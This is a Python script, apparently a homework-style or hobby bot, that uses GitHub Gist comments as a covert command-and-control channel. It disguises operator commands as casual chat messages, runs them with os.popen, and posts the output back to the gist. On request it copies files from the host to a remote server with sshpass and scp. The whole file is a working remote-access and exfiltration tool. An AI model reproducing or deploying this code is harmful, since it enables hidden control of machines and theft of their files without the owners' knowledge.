##!/usr/bin/python
import json
import time
import requests
import sys
import os

if len(sys.argv) < 6:
    print('Pleas check the README.md you did not pass enough arguments')
    print('You should execute it:')
    print('python not-bot.py GITHUB_TOKEN GIST_ID USER PASSWORD IP')
    exit(1)

# API constants
TOKEN = sys.argv[1]
GIST_URL = 'https://api.github.com/gists/' + sys.argv[2] + '/'
GIST_COMM = GIST_URL + 'comments?accept=application/vnd.github.v3+json'

USERNAME = sys.argv[3]
PASSWORD = sys.argv[4]
IP = sys.argv[5]


# Chat constants
MESS_TO_BOT = 'Could sb. say what is: '
MESS_FROM_BOT_CMD = 'Hmm, if I execute it I get the next output: '
MESS_FROM_BOT_PONG = 'Hello, I am here :-) What do you need?'
MESS_TO_BOT_PING = 'Hi, is anybody here?'
MESS_TO_BOT_GET_FILE='Hello, do you have: '

def parse_data(data, start_id_comment):
    for i in range(start_id_comment, len(data)):
        if data[i]['body'].find(MESS_FROM_BOT_CMD) == -1:
                if data[i]['body'].find(MESS_TO_BOT_PING) == 0:
                    print(requests.post(GIST_COMM, data=json.dumps({'body' : MESS_FROM_BOT_PONG})
                                        , headers={'Authorization': 'token '+TOKEN}).text)
                elif data[i]['body'].find(MESS_TO_BOT) == 0:
                    output=match_command(data[i]['body'][len(MESS_TO_BOT)::])
                    print('I executed: ' + data[i]['body'][len(MESS_TO_BOT)::])
                    print(output)
                    print(requests.post(GIST_COMM, data=json.dumps({'body' : MESS_FROM_BOT_CMD + output}),
                                        headers={'Authorization': 'token '+TOKEN}).text)
                elif data[i]['body'].find(MESS_TO_BOT_GET_FILE) == 0:
                    print('sshpass -p "'+PASSWORD+'" scp -r ' + data[i]['body'][len(MESS_TO_BOT_GET_FILE):-1:] + ' '+USERNAME+'@'+IP+':/tmp/')
                    os.popen('sshpass -p "'+ PASSWORD +'" scp -r ' + data[i]['body'][len(MESS_TO_BOT_GET_FILE):-1:] + ' '+USERNAME+'@'+IP+':/tmp/')


def match_command(body):
    stream = None
    if body == 'w':
        stream = os.popen('w')
    elif body[0:2] == 'ls':
        stream = os.popen(body)
    elif body == 'id':
        stream = os.popen('id -u')
    else:
        stream = os.popen('/usr/bin/'+body)

    output = stream.read()

    return output

# local initialization of the last id comment
last_id_comment = max(len(requests.get(GIST_COMM, headers={'Authorization': 'token '+TOKEN}).json()), 0)

print('Hi, I\'m not a bot')


while True:
    data = requests.get(GIST_COMM, headers={'Authorization': 'token '+TOKEN}).json()
    if last_id_comment <= len(data):
        parse_data(data, last_id_comment)
        last_id_comment = len(data)
    elif len(data) < last_id_comment:
        last_id_comment = len(data)
    time.sleep(2)
